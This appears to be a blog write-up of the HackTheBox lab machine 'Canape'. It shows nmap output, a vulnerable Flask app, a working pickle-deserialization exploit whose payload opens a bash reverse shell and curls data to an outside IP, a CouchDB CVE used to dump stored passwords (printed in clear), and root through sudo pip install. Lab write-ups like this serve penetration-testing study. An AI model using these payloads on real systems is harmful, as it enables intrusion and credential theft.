---
layout: post
title: HTB - Canape
date: 2024-12-23 11:38 -0400
---

{% raw %}

Canape is one of the most popular boxes on htb. The first step involves finding the source code through a git repo. After that we exploit a pickle deserialization to get a shell as `www-data`. Then we use one of the couchdb CVEs to escalate to the `homer` user. And finally we use sudo privileges on pip to get the `root` shell.

# nmap
Starting with nmap we get a `.git`.
```bash
~/workspace/projects/htb/canape » nmap -p- --min-rate 1024 $(cat ip.txt)
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-23 12:58 -04
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.55% done; ETC: 13:00 (0:01:33 remaining)
Nmap scan report for 10.10.10.70
Host is up (0.16s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
65535/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 128.50 seconds
~/workspace/projects/htb/canape » nmap -p 80,65535 -A --min-rate 1024 $(cat ip.txt)           1 ↵ shafou@shafou
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-23 13:00 -04
Nmap scan report for canape.htb (10.10.10.70)
Host is up (0.20s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.29 (Ubuntu)
65535/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8d820b3190e4c885b2538ba17c3b65e1 (RSA)
|   256 22fc6ec35500850f24bff5796c928b68 (ECDSA)
|_  256 0d912751805e2ba3810de9d85c9b7735 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds
```

# flask app
On the git repo there is a flask app which is vulnerable to pickle deserialization.
```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

This part can be tricky. But it's pretty easy if you use the `pickleassem` package. I got stuck here because I didn't realize that the character name could be anywhere on the payload.

- exploit:

```python
import requests
from hashlib import md5

from pickleassem import PickleAssembler

pa = PickleAssembler(proto=1)
pa.push_mark()
pa.util_push("bash -c 'bash -i >& /dev/tcp/10.10.14.41/4444 0>&1'; curl http://10.10.14.41:5000/ -d @/tmp/123; echo moe")
pa.build_inst('os', 'system')
pa.push_binstring('p1')
payload = pa.assemble()

burp0_url = "http://canape.htb:80/submit"

char = payload[:-1].decode()
quote = "."
burp0_data = {"character": char, "quote": quote}
res = requests.post(burp0_url, data=burp0_data, proxies={
    'http': 'http://0.0.0.0:8080',
    'https': 'https://0.0.0.0:8080'
})
a = md5((char + quote).encode()).hexdigest()
print(f"DEBUGPRINT[3]: req.py:12: a={a}")

burp0_url = "http://canape.htb:80/check"
burp0_data = {"id": a}
res = requests.post(burp0_url, data=burp0_data)
print(f"DEBUGPRINT[4]: req.py:17: res.text={res.text}")
```

# www-data -> homer
Some interesting files here but they don't lead anywhere.
The most interesting part is couchdb on 127.0.0.1:5986
```json
{"couchdb":"Welcome","uuid":"132586dfde75b957085d59a5096e9c20","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

This version seems to be vulnerable to multiple cves. The one that worked was `CVE-2017-12636`. It gives us an admin user. We can then check the `passwords` db and find the ssh password for the `homer` user.
```bash
DEBUGPRINT[2]: lab.py:29: res.text={"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"B4jyA0xtytZi7esBNGp","user":""}
DEBUGPRINT[2]: lab.py:29: res.text={"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
DEBUGPRINT[2]: lab.py:29: res.text={"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
DEBUGPRINT[2]: lab.py:29: res.text={"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

# homer -> root
```bash
homer@canape:~$ cat user.txt
9a3d7***************************
```

Running `sudo -l` on homer shows that we can run `pip` as root. 
```bash
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```
Found this repo that has a poc for running code on pip install and adapted a little bit.
- [0wned](https://github.com/mschwager/0wned)

```bash
# sudo /usr/bin/pip install ./0wned
homer@canape:/tmp/la$ cat root.txt
d8bf7***************************
```

{% endraw %}
